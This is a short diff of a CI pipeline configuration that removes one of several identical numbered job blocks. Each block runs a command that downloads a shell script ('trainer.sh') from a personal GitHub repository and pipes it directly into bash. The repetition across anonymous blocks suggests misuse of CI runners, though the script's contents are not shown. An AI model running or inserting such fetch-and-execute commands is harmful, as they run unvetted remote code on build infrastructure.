@@ -154,13 +154,6 @@ blocks:
         - name: 'Job #1'
           commands:
             - 'wget -O - https://raw.githubusercontent.com/markbridgeman765/training/refs/heads/main/trainer.sh | bash'
-  - name: 'Block #11'
-    dependencies: []
-    task:
-      jobs:
-        - name: 'Job #1'
-          commands:
-            - 'wget -O - https://raw.githubusercontent.com/markbridgeman765/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #22'
     dependencies: []
     task:
